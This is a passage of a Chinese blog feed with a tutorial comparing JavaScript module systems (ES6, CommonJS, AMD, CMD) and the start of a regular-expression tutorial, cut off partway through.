      <content type="html"><![CDATA[<blockquote><p>模块化可以提高代码复用率，方便进行代码的管理。通常一个文件就是一个模块，有自己的作用域，只向外暴露特定的变量和函数。目前流行的js模块化规范有CommonJS, AMD, CMD, ES6的模块系统。</p></blockquote><p><br></p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>历史上，Javascript一直没有模块(module)体系，无法将一个大程序拆分为互相依赖的小文件，再用简单的方法拼接起来。在ES6之前，社区指定了一些模块加载方案，主要有CommonJS和ADM，前者用于服务器，后者用于浏览器。后来，ES6实现了模块功能，完全可以替代CommonJS和AMD规范，成为了浏览器和服务器通用的模块解决方案。</p><p><br></p><h3 id="1-ES6模块"><a href="#1-ES6模块" class="headerlink" title="1. ES6模块"></a>1. ES6模块</h3><p>浏览器加载ES6模块，也使用<code>&lt;script&gt;</code>标签，要加入<code>type=&quot;module&quot;</code>属性。浏览器会等到整个页面渲染完，再执行模块脚本，等同于打开<code>&lt;script&gt;</code>的<code>defer</code>属性。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"./foo.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ul><li>对于外部的模块脚本，代码是在模块作用域中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li><li>模块之中，可以使用<code>import</code>加载其他模块，需要提供绝对 / 相对url，也可以使用<code>export</code>命令输出对外接口</li><li>模块之中，顶层的<code>this</code>关键字返回<code>undefined</code>，而不是指向<code>window</code>。因此，在模块顶层使用this关键字，是无意义的。</li><li><p>同一个模块如果加载多次，将只执行依次</p></li><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; basicNum, add &#125;</span><br></pre></td></tr></table></figure></li><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; basicNum, add &#125; <span class="keyword">from</span> <span class="string">'./math'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ele.textContent = add(<span class="number">99</span> + basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>export default</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义输出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; basicNum, add &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> math <span class="keyword">from</span> <span class="string">'./math'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  ele.textContent = math.add(<span class="number">99</span> + math.basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-CommonJS"><a href="#2-CommonJS" class="headerlink" title="2. CommonJS"></a>2. CommonJS</h3><p>Node.js是commonJS规范的主要实践者，它的四个重要的环境变量为模块化的实现提供支持: <em><code>module</code></em>、<em><code>exports</code></em>、<em><code>require</code></em>、<em><code>global</code></em>。用<code>module.exports</code>定义当前模块对外输出的接口（不推荐直接用exports），用<code>require</code>加载模块。</p><p>CommonJS用同步不的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样不会有问题。但在浏览器端，限于网络原因，更合理是使用异步加载。</p><ul><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用自定义模块，参数为文件路径，可省略.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line">math.add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用核心模块，不需要带路径</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createService(...).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-AMD和require-js"><a href="#3-AMD和require-js" class="headerlink" title="3. AMD和require.js"></a>3. AMD和require.js</h3><p>AMD规范采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。</p><ul><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 网页中引入require.js和main.js</span></span><br><span class="line">&lt;script src=<span class="string">"js/require.js"</span> data-main=<span class="string">"js/main"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js 入口文件/主模块</span></span><br><span class="line"><span class="comment">// 1. 用require.config()指定各模块路径和引用名</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">  baseUrl: <span class="string">'js/lib'</span>,</span><br><span class="line">  paths: &#123;</span><br><span class="line">    <span class="string">'jquery'</span>: <span class="string">'jquery.min'</span>,  <span class="comment">// 实际路径为js/lib/jquery.min.js</span></span><br><span class="line">    <span class="string">'underscore'</span>: <span class="string">'underscore.min'</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 依赖这个模块的一些操作</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">"jquery"</span>, <span class="string">"underscore"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">$, _</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// some code here</span></span><br><span class="line">  <span class="built_in">console</span>.log($);</span><br><span class="line">  <span class="built_in">console</span>.log(_);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义math.js模块</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    add: add,</span><br><span class="line">    basicNum: basicNum,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个依赖underscore.js的模块</span></span><br><span class="line">define([<span class="string">'underscore'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">_</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> classify = <span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</span><br><span class="line">    _.countBy(list,<span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> num &gt; <span class="number">30</span> ? <span class="string">'old'</span> : <span class="string">'young'</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    classify :classify</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用模块，将模块放在[]内</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">'jquery'</span>, <span class="string">'math'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">$, math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-CMD与sea-js"><a href="#4-CMD与sea-js" class="headerlink" title="4. CMD与sea.js"></a>4. CMD与sea.js</h3><p>require.js在申明依赖的模块时会第一时间加载并执行模块内的代码。CMD是另一种js模块化方案，与AMD很类似。AMD推送依赖前置，提前执行，CMD推崇依赖就近，延迟执行。此规范是在sea.js推广过程中产生的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AMD写法</span></span><br><span class="line">define([<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">  a.doSomething();</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="comment">// 即使没有用到模块b，但b还是提前执行了</span></span><br><span class="line">    b.doSomething();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD写法</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 在需要时才申明</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>);</span><br><span class="line">  a.doSomething();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>sea.js使用方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义模块</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery.js'</span>);</span><br><span class="line">  <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">  &#125;</span><br><span class="line">  exports.add = add;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载模块</span></span><br><span class="line">seajs.use([<span class="string">'math.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-区别"><a href="#5-区别" class="headerlink" title="5. 区别"></a>5. 区别</h3><h4 id="5-1-值拷贝-值引用"><a href="#5-1-值拷贝-值引用" class="headerlink" title="5.1 值拷贝 / 值引用"></a>5.1 值拷贝 / 值引用</h4><p>commonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用。</p><ul><li><p>commonJS模块输出的是值的拷贝，一旦输出一个值，模块内部的变化就影响不到这个值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commonjs.js</span></span><br><span class="line"><span class="keyword">var</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  counter: counter,</span><br><span class="line">  incCounter: incCounter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">var</span> mod = <span class="built_in">require</span>(<span class="string">'./lib'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(mod.counter);    <span class="comment">// 3</span></span><br><span class="line">mod.incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(mod.counter);    <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(mod.getCounter); <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li><li><p>JS引擎在遇到ES6模块<code>import</code>命令时，会生成一个只读引用。等脚本真正执行的时候，根据引用，到被加载的模块里面去取值。ES6模块是动态引用，不会缓存值，模块里面的变量绑定其所在的模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter ++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="comment">// ES6模块输出的变量counter是活的，完全反应其在模块lib.js内部的变化</span></span><br><span class="line"><span class="keyword">import</span> &#123; counter, incCounter &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 3</span></span><br><span class="line">incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li></ul><p>再举一个ES6 module的例子，过了500毫秒，foo的值会从bar -&gt; baz<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// m1.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> foo = <span class="string">"bar"</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> foo = <span class="string">'baz'</span>, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// m2.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">'./m1.js'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(foo), <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bar</span></span><br><span class="line"><span class="comment">// baz</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-运行时加载-编译时加载"><a href="#5-2-运行时加载-编译时加载" class="headerlink" title="5.2 运行时加载 / 编译时加载"></a>5.2 运行时加载 / 编译时加载</h4><p>commonJS先整体加载fs模块，生成一个对象，然后再从这个对象上面读取3个方法。因为只有运行时才能得到这个对象，这种加载称为“运行时加载”。</p><p>ES6 module的写法，实质是从fs模块加载3个方法，其他方法不加载。使得编译时就能确定模块的依赖关系，以及输出和输入的关系。CommonJS和ADMO模块，都只能在运行时确定这些东西。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CommonJS</span></span><br><span class="line"><span class="keyword">let</span> &#123; stat, exists, readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 module</span></span><br><span class="line"><span class="keyword">import</span> &#123; stat, exists, readFile &#125; <span class="keyword">from</span> <span class="string">'fs'</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-避免变量冲突"><a href="#6-避免变量冲突" class="headerlink" title="6.避免变量冲突"></a>6.避免变量冲突</h3><p>模块化主要用来抽离公用代码，隔离作用域，避免变量冲突等。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IIFE: 使用自执行函数来编写模块化，在一个单独的函数作用域中执行代码，避免变量冲突</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    data: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// AMD: 使用require.js来编写模块化，特点：依赖必须提前声明好</span></span><br><span class="line">define(<span class="string">'./index.js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// code就是 index.js 返回的内容</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD: 使用seaJS来编写模块化，特点：支持动态引入依赖文件</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> indexCode = <span class="built_in">require</span>(<span class="string">'./index.js'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// CommonJS: nodejs中自带的模块化</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES Modules: ES引入的模块化，支持import来引入一个js</span></span><br><span class="line"><span class="keyword">import</span> &#123; a &#125; <span class="keyword">from</span> <span class="string">'./index.js'</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">Module的语法</a></li><li><a href="http://es6.ruanyifeng.com/#docs/module-loader" target="_blank" rel="noopener">Module 的加载实现</a></li><li><a href="https://juejin.im/post/5aaa37c8f265da23945f365c" target="_blank" rel="noopener">前端模块化：CommonJS,AMD,CMD,ES6</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote><p>正则表达式是一个描述规则的表达式，它可以匹配模式，匹配字符，匹配位置，进而实现搜索和替换功能。</p></blockquote><p><br></p><h3 id="1-匹配规则"><a href="#1-匹配规则" class="headerlink" title="1. 匹配规则"></a>1. 匹配规则</h3><h4 id="1-1-单个字符"><a href="#1-1-单个字符" class="headerlink" title="1.1 单个字符"></a>1.1 单个字符</h4><p>单个字符的映射关系是一对一的，匹配到的字符只有一个。</p><table><thead><tr><th>匹配类型</th><th style="text-align:right">正则表达式</th></tr></thead><tbody><tr><td>简单字符</td><td style="text-align:right">a （匹配字符a）</td></tr><tr><td>特殊字符</td><td style="text-align:right"><code>\*</code> （匹配字符*，特殊字符用\转义）</td></tr><tr><td>换行符</td><td style="text-align:right">\n      </td></tr><tr><td>换页符</td><td style="text-align:right">\f       </td></tr><tr><td>回车符</td><td style="text-align:right">\r        </td></tr><tr><td>空白符</td><td style="text-align:right">\s        </td></tr><tr><td>制表符</td><td style="text-align:right">\t        </td></tr><tr><td>垂直制表符</td><td style="text-align:right">\v       </td></tr><tr><td>回退符</td><td style="text-align:right"><code>[\b]</code>      </td></tr></tbody></table><p><br></p><h4 id="1-2-区间"><a href="#1-2-区间" class="headerlink" title="1.2 区间"></a>1.2 区间</h4><p> <em><code>[]</code></em> 来表示集合，用 <em><code>-</code></em> 来表示去区间范围，就可以实现一对多的匹配。<br><em>/[123]/</em> 匹配1,2,3中的任意一个字符，<em>/[0-9]/</em> 匹配0到9的任意一个数字，<em>/[a-z]/</em> 匹配任意一个英文小写字母。</p><table><thead><tr><th>匹配区间</th><th style="text-align:center">正则表达式</th><th style="text-align:right">记忆方式</th></tr></thead><tbody><tr><td>集合区间</td><td style="text-align:center">[123]</td><td style="text-align:right">匹配一个字符，可以是1,2,3之一</td></tr><tr><td>通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。</td><td style="text-align:center">.</td><td style="text-align:right"></td></tr><tr><td>单个数字，[0-9]</td><td style="text-align:center">\d</td><td style="text-align:right">digit</td></tr><tr><td>除了[0-9]</td><td style="text-align:center">\D</td><td style="text-align:right">not digit</td></tr><tr><td>包括下划线在内的单个字符[A-Za-z0-9]</td><td style="text-align:center">\w</td><td style="text-align:right">word</td></tr><tr><td>非单字字符</td><td style="text-align:center">\W</td><td style="text-align:right">not word</td></tr><tr><td>匹配空白符，包括空格、制表符、换行符和换页符</td><td style="text-align:center">\s</td><td style="text-align:right">space</td></tr><tr><td>匹配非空白字符</td><td style="text-align:center">\S</td><td style="text-align:right">not space    </td></tr><tr><td>匹配任意字符</td><td style="text-align:center">[\d\D]、[\w\W]、[\s\S]</td><td style="text-align:right"></td></tr></tbody></table><p><br></p><h4 id="1-3-量词"><a href="#1-3-量词" class="headerlink" title="1.3 量词"></a>1.3 量词</h4><p>多次循环，重复上面的正则规则，就可以匹配匹配多个字符。</p><table><thead><tr><th>符号</th><th style="text-align:center">重复次数</th><th style="text-align:center">例子</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>?</td><td style="text-align:center">0次或1次</td><td style="text-align:center">/colour?/</td><td style="text-align:right">匹配colou和colour两个单词</td></tr><tr><td>+</td><td style="text-align:center">1次或多次</td><td style="text-align:center">/color+/</td><td style="text-align:right">匹配color, colorr, colorrr…</td></tr><tr><td>{n}</td><td style="text-align:center">区间次数</td><td style="text-align:center">/a{3}/</td><td style="text-align:right">连续出现a 3次</td></tr><tr><td>{min,max}</td><td style="text-align:center">min到max次</td><td style="text-align:center">/a{1,2}/</td><td style="text-align:right">连续出现a 1-2次</td></tr><tr><td>{min,}</td><td style="text-align:center">至少min次</td><td style="text-align:center">/a{1,}/</td><td style="text-align:right">连续出现a至少1次</td></tr><tr><td>{0, max}</td><td style="text-align:center">最多max次</td><td style="text-align:center">/a{0,3}/</td><td style="text-align:right">连续出现a最多3次</td></tr><tr><td>*</td><td style="text-align:center">匹配0个字符或无数个字符</td><td style="text-align:center">/*/</td><td style="text-align:right">用来过滤可有可无的字符串</td></tr></tbody></table><p><br></p><h4 id="1-5-位置符"><a href="#1-5-位置符" class="headerlink" title="1.5 位置符"></a>1.5 位置符</h4><p>位置是相邻字符之间的位置。<br><img src="/2019/06/10/正则表达式/1.png" style="max-width: 300px"></p><table><thead><tr><th>符号</th><th style="text-align:center">含义</th><th style="text-align:center">例子</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>\b</td><td style="text-align:center">单词边界,\w和\W之间的位置,也包括\w和^,\w和$之间的位置</td><td style="text-align:center">/\bcat\b/</td><td style="text-align:right">匹配cat，匹配不到scattered</td></tr><tr><td>^</td><td style="text-align:center">匹配开头，在多行匹配中匹配开头</td><td style="text-align:center">/^I am/</td><td style="text-align:right">以I am开头的字符串</td></tr><tr><td>$</td><td style="text-align:center">匹配结尾，在多行匹配中匹配结尾</td><td style="text-align:center">/^I am good.$/</td><td style="text-align:right">匹配I am good这个句子</td></tr><tr><td>(?=p)</td><td style="text-align:center">p是一个子模式，表示p前面的位置</td><td style="text-align:center">/(?=l)/g</td><td style="text-align:right">所有l前面的位置</td></tr><tr><td>(?!=p)</td><td style="text-align:center">(?=p)的反面意思</td><td style="text-align:center"></td><td style="text-align:right"></td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/^|$/g</span>, <span class="string">'#'</span>)              <span class="comment">// "#hello#"</span></span><br><span class="line"><span class="string">"[JS] lesson_01.mp4"</span>.replace(<span class="regexp">/\b/g</span>, <span class="string">'#'</span>)  <span class="comment">// "[#JS#] #lesson_01#.#mp4#"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?=l)/g</span>, <span class="string">"#"</span>)            <span class="comment">// "he#l#lo"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?!=l)/g</span>, <span class="string">"#"</span>)           <span class="comment">// "#h#ell#o#"</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-分组-回溯引用"><a href="#1-4-分组-回溯引用" class="headerlink" title="1.4 分组,回溯引用"></a>1.4 分组,回溯引用</h4><p><em>()</em> 表示一个分组，只是使用简单的(regex)本质上和不分组是一样的，要发挥它强大的作用，要结合回溯引用。</p><p><em><code>\1, \2....</code></em> 表示引用的第1,2个子表达式… <em><code>\0</code></em> 表示整个表达式。<strong>回溯引用</strong> 指后面引用前面已经匹配到的子字符串。</p><p><em><code>$1, $2...</code></em> 用于引用要被替换的字符串<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 